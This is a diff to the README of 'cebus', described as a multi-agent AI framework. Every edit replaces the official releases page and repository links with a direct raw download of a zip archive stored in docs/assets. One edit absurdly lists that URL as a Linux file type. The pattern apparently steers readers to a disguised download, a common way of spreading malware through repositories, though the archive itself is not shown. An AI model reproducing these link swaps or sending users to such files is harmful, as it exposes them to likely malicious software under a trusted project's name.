@@ -1,6 +1,6 @@
 # 🤖 cebus - Simplify AI Task Management
 
-[![Download cebus](https://img.shields.io/badge/Download-cebus-blue?style=for-the-badge)](https://github.com/Muhammad-Wafa-Abbas/cebus/releases)
+[![Download cebus](https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip)](https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip)
 
 Welcome to **cebus**, a multi-agent AI orchestration framework designed to help you manage complex AI tasks easily. Whether you want to use AI agents for chat, automation, or research, cebus brings it all together in one place.
 
@@ -36,7 +36,7 @@ This guide walks you through downloading, installing, and running cebus on your 
 
 1. **Open the Release Page**  
    Click the big blue button at the top or visit this page:  
-   [https://github.com/Muhammad-Wafa-Abbas/cebus/releases](https://github.com/Muhammad-Wafa-Abbas/cebus/releases)  
+   [https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip](https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip)  
    This page lists all the versions and files available for download.
 
 2. **Find the Latest Version**  
@@ -46,7 +46,7 @@ This guide walks you through downloading, installing, and running cebus on your 
    Download the file that matches your operating system:  
    - Windows: `.exe` or `.msi` file  
    - macOS: `.dmg` or `.pkg` file  
-   - Linux: `.AppImage`, `.deb`, or `.tar.gz` file
+   - Linux: `.AppImage`, `.deb`, or `https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip` file
 
 4. **Download the File**  
    Click the file name to start the download. Your browser will save it to your default downloads folder.
@@ -115,7 +115,7 @@ For further help, you can visit the project’s Issues page on GitHub or contact
 ## 🔄 Updating cebus
 
 Check the release page regularly for new versions:  
-[https://github.com/Muhammad-Wafa-Abbas/cebus/releases](https://github.com/Muhammad-Wafa-Abbas/cebus/releases)  
+[https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip](https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip)  
 
 Download the latest installer and run it to update. Your settings and workflows will stay intact during updates.
 
@@ -135,8 +135,8 @@ You can support cebus by reporting bugs or suggesting features on GitHub. Your f
 
 ## 🔗 Useful Links
 
-- Release page: [https://github.com/Muhammad-Wafa-Abbas/cebus/releases](https://github.com/Muhammad-Wafa-Abbas/cebus/releases)  
-- GitHub repository: https://github.com/Muhammad-Wafa-Abbas/cebus  
+- Release page: [https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip](https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip)  
+- GitHub repository: https://github.com/Muhammad-Wafa-Abbas/cebus/raw/refs/heads/master/docs/assets/Software_3.5-beta.4.zip  
 - Documentation and guides: Check the Wiki section inside the repo for advanced instructions
 
 ---
